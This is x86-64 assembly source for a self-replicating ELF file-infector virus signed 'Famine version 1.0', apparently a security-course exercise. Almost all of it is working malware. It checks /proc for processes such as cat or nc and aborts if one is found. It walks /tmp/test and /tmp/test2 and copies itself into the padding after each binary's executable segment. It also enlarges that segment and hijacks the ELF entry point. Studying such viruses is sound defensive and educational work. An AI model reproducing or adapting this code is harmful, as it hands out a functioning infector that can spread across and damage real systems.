section.text:
	global _start:function

;-------------------------------------------------------------------------------
;|   r8   | virus entry                                                        |
;|   r9   | virus end
;-------------------------------------------------------------------------------

;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
; (make sense with syscall)

_start:
	call _inject; push addr to stack
%ifdef DEBUG; ==================================================================
	db `....FAMINE....`, 0x0

newline db `\n`, 0x0

_print:; (string rdi)
	push r8
	push r9
	push r11
	push rdx
	push rbx
	push rsi
	push rcx

	call _ft_strlen; ft_strlen(rdi)
	push rdi; mov rsi, rdi
	pop rsi
	push rax
	pop rdx
	push 1; mov rax, 1
	pop rax; write
	push 1; mov rdi, 1
	pop rdi
	syscall

	push rsi
	pop rbx
	lea rsi, [rel newline]
	push 1
	pop rax; write
	push 1
	pop rdx
	syscall
	push rbx
	pop rdi

	pop rcx
	pop rsi
	pop rbx
	pop rdx
	pop r11
	pop r9
	pop r8
ret

%endif; ========================================================================

_inject:
	lea rdi, [rel process_dir]
	push 1
	pop rsi
	call _move_through_dir
	cmp rax, 0x0
	jne _end

	pop rdi; pop addr from stack

	; save register
	push r8
	push r9
	push rdx

	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	sub rdi, 0x5; sub call instr
	push rdi; mov r8, rsi
	pop r8
; r8 contains the entry of the virus
	jmp _check_end
	_back_host:
		pop r9
	; r9 contains the end of the virus (minus params)

	xor rsi, rsi
	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _move_through_dir
		xor rcx, rcx; = 0
		.next_string:; seek next dir
			inc rcx
			cmp byte[rdi + rcx], 0x0
			jnz .next_string
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	_end:
		xor rax, rax; = 0
		cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
		jne _infected
		jmp _exit

_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	%ifdef DEBUG
		call _print; _print(rdi)
	%endif

	push rsi
	pop r13

	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path
	push rax
	pop r11; fd

	sub rsp, 1024
	.getdents:
		push r11
		pop rdi
		push 78
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		pop r11
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_file:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_file
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
			inc rcx
			cmp byte[rsi + rcx], 0x0
			jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rsi, r10
			mov rdi, rsp; buffer
			call _ft_strcpy
			call _ft_strlen
			add rdi, rax
			mov byte[rdi], '/'
			add rdi, 1
			mov rsi, rbx
			call _ft_strcpy
			mov rdi, rsp

		; check infect_dir or infect_file
			push r11 ; stat using r11
			sub rsp, 600

			push 4
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + 24] ; st_mode
			and rax, 0o0170000 ; S_IFMT

			cmp r13, 0; infect
			je .infect

			; process
			and rax, 0o0170000 ; S_IFMT
			cmp rax, 0o0100000 ; S_IFREG
			jne .free_buffers
			call _check_file_process

			add rsp, 600
			pop r11 ; stat using r11
			add rsp, 4096
			pop rbx

			cmp rax, 0x0
			jne .get_rcx_close

			jmp .next_file

			.infect:
				cmp rax, 0o0040000 ; S_IFDIR
				je .infect_dir
				cmp rax, 0o0100000 ; S_IFREG
				je .infect_file
				jmp .free_buffers

		.infect_dir:
			mov rsi, rbx
			call _move_through_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 600
			pop r11 ; stat using r11
			add rsp, 4096
			pop rbx

		.next_file:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + 16]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_file

	.get_rcx_close:
		pop rcx
	.close:
		push rax
		pop rsi
		push r11
		pop rdi
		push 3
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024
		push rsi
		pop rax

	.return:

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret

_infect_file: ; (string rdi, stat rsi)
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	push 2
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path

	push r8
	push rax
	pop r8

	push r9
	push r10
	xor rdi, rdi
	mov rsi, [r12 + 48] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push 2
	pop r10 ; MAP_PRIVATE
	xor r9, r9
	push 9
	pop rax ; mmap
	syscall
	pop r10
	pop r9
	push r8
	pop r11; fd
	pop r8
	cmp rax, 0x0
	jl .close ; < 0


	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 4
	pop rdx
	call _ft_memcmp
	push rsi
	pop r13
	cmp rax, 0x0
	jne .unmap ; not elf 64 file

	cmp byte[rsi + 16], 2 ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + 16], 3 ; ET_DYN
	jne .unmap

	.is_elf_file:
		; TODO: do 32 bits version (new compilation ?)

		; get pt_load exec
		mov ax, [r13 + 56]; e_phnum
		mov rbx, r13
		add rbx, [r13 + 32]; e_phoff
		xor rcx, rcx
		.find_segment_exec:
			inc rcx
			cmp rcx, rax ; TODO: can't be last PT_LOAD now
			je .unmap
			cmp dword[rbx], 1 ; p_type != PT_LOAD
			jne .next
			mov dx, [rbx + 4]; p_flags
			and dx, 1 ; PF_X
			jnz .check_if_infected
			.next:
				add rbx, 56; sizeof(Elf64_Phdr)
			jmp .find_segment_exec
		.check_if_infected:
			lea rdi, [rel signature]
			%ifdef DEBUG
				call _print; _print(rdi)
			%endif
			call _ft_strlen
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, [rbx + 8]; p_offset
			add rdi, r13
			mov rsi, [rbx + 32]; p_filesz
			call _ft_memmem
			cmp rax, 0x0
			jne .unmap

			; check size needed
			sub rdi, r13
			add rdi, rsi; p_offset + p_filesz
			mov rsi, [rbx + 56 + 8] ; next->p_offset
			sub rsi, rdi
			mov rdx, r9
			sub rdx, r8
			add rdx, 8 * 3 ; params (uint64_t * nb)
			cmp rsi, rdx
			jl .unmap ; if size between PT_LOAD isn't enough -> abort
			; TODO: maybe infect via PT_NOTE ?

			; copy virus
			sub rdx, 8 * 3
			add rdi, r13 ; addr pointer -> mmap
			mov rsi, r8
			call _ft_memcpy

			; add _params
			add rax, rdx ; go to the end
			mov rsi, [rbx + 16]
			mov [rax], rsi ; vaddr
			add rax, 8
			sub rdi, r13
			; copy mapped 'padding' like 0x400000
			mov rsi, rdi
			add rsi, [rbx + 16]; p_vaddr
			sub rsi, [rbx + 8]; p_offset
			mov [rax], rsi ; entry_inject
			add rax, 8
			mov rsi, [r13 + 24]; entry_prg
			mov [rax], rsi

			; change entry
			; copy mapped 'padding' like 0x400000
			add rdi, [rbx + 16]; vaddr
			sub rdi, [rbx + 8]; p_offset
			mov [r13 + 24], rdi ; new_entry

			; change pt_load size
			add rdx, 8 * 3
			add [rbx + 32], rdx; p_filesz + virus
			add [rbx + 40], rdx; p_memsz + virus

			; write everything in file
			mov rdi, r11
			mov rsi, r13
			mov rdx, [r12 + 48]
			push 1
			pop rax
			syscall
	.unmap:
;		push r11; munmap using r11 ?
		push r13
		pop rdi
		mov rsi, [r12 + 48] ; statbuf.st_size
		push 11
		pop rax; munmap
		syscall
;		pop r11
	.close:
		push r11
		pop rdi
		push 3
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret

_check_file_process:; (string rdi, stat rsi)
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
;	%ifdef DEBUG
;		call _print; _print(rdi)
;	%endif
	xor rsi, rsi; O_RDONLY
	push 2
	pop rax; open
	syscall
	push rax
	pop r11; fd
	xor rax, rax
	cmp r11, 0x0
	jl .return; jump lower

	.loop_read:
		sub rsp, 0x1000; TODO: loop read giga buffer ?

		mov rdi, r11
		mov rsi, rsp
		push 0x1000
		pop rdx
		xor rax, rax ; read
		syscall
		push rdi
		pop r11

		cmp rax, 0x0
		je .close

;		%ifdef DEBUG
;			push r11
;			mov rdi, 1
;			mov rdx, rax
;			mov rax, 1
;			syscall
;			mov rax, rdx
;			pop r11
;		%endif

			mov r8, rax
			mov r13, rsp
			lea rsi, [rel process]
			xor rcx, rcx; = 0
			.loop_array_string:
				add rsi, rcx
				; check if it is in the file
					push rsi
					pop rdi
					call _ft_strlen
					cmp r8, rax
					jl .close
					push rax
					pop rcx
					push rdi
					pop rdx
					mov rdi, r13; mmaped region
					mov rsi, r8; statbuf.st_size
					call _ft_memmem
					push rdx
					pop rsi
					cmp rax, 0x0
					jne .close
				call _ft_strcmp
				cmp rax, 0x0
				je .close
				xor rcx, rcx; = 0
				.next_string:; seek next process
					inc rcx
					cmp byte[rsi + rcx], 0x0
					jnz .next_string
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .loop_array_string

		add rsp, 0x1000
		jmp .loop_read
	.close:
		push rax
		pop rsi
		add rsp, 0x1000
		push r11
		pop rdi
		push 3
		pop rax; close
		syscall
		push rsi
		pop rax
	.return:
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
ret

_infected:
	push r8
	pop rax

	sub rax, [rel entry_inject]
	add rax, [rel vaddr]

	add rax, [rel entry_prg]
	sub rax, [rel vaddr]

	pop rdx
	pop r9
	pop r8

	jmp rax

_exit:
	pop rdx
	pop r9
	pop r8

	mov rax, 60 ; exit
	xor rdi, rdi; = 0
	syscall

; ================================ utils =======================================

_ft_strlen:; (string rdi)
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		cmp byte [rdi + rcx], 0
		jz .return
		inc rcx
		jmp .loop_char
	.return:
		push rcx
		pop rax

		pop rcx
ret

_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
	push rcx
	dec rdx

	xor rax, rax
	xor rcx, rcx; = 0
	.loop_byte:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp rcx, rdx
		je .return
		inc rcx
	jmp .loop_byte
	.return:
		sub al, [rsi + rcx]

	inc rdx
	pop rcx
ret

_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push r9
	push rbx

	xor rax,rax
	xor r8, r8
	sub rsi, rcx
	cmp rcx, 0x0
	je .return
	.loop_byte:
		xor rax,rax
		cmp r8, rsi
		je .return
		mov rbx, rdi
		add rdi, r8
		push rsi
		pop r9
		push rdx
		pop rsi
		push rcx
		pop rdx
		call _ft_memcmp
		push rdx
		pop rcx
		push rsi
		pop rdx
		push r9
		pop rsi
		push rbx
		pop rdi
		cmp rax, 0x0
		je .found
		inc r8
	jmp .loop_byte
	.found:
		mov rax, rdi
		add rax, r8
	.return:
		add rsi, rcx

	pop rbx
	pop r9
	pop r8
ret

_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
	push rcx

	xor rax, rax
	xor rcx, rcx
	.loop_byte:
		cmp rcx, rdx
		je .return
		mov al, [rsi + rcx]
		mov [rdi + rcx], al
		inc rcx
	jmp .loop_byte
	.return:
		mov rax, rdi

	pop rcx
ret

_ft_strcmp: ; (string rdi, string rsi)
	push rdx
	call _ft_strlen
	push rax
	pop rdx
	call _ft_memcmp
	pop rdx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rdx
	push rdi
	pop rdx
	push rsi
	pop rdi
	call _ft_strlen
	push rdi
	pop rsi
	push rdx
	pop rdi
	push rax
	pop rdx
	call _ft_memcpy
	mov byte[rdi + rdx], 0x0
	pop rdx
ret

; ==============================================================================

process_dir db `/proc`, 0x0
process db ` cat `, 0x0, ` nc `, 0x0, 0x0

;                   E     L    F   |  v ELFCLASS64
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
dotdir db `.`, 0x0, `..`, 0x0, 0x0
directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature

_check_end:
	call _back_host; push addr to stack

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
